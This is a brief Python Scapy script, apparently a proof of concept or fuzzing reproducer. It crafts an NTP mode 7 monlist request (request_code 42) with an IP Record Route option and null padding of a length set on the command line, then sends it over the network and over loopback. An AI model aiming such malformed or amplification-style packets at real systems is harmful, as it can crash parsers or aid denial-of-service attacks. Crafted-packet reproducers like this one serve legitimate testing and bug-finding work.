from scapy.all import *
import sys

num = int(sys.argv[1]) - 8
pkt = Ether()/IP(options=[IPOption_RR(routers=['1.1.1.1'] * 6)])/UDP()/NTPPrivate(version=2, mode=7, implementation=3, request_code=42)/Raw('\x00' * num)

send(pkt)
sendp(pkt, iface = 'lo')
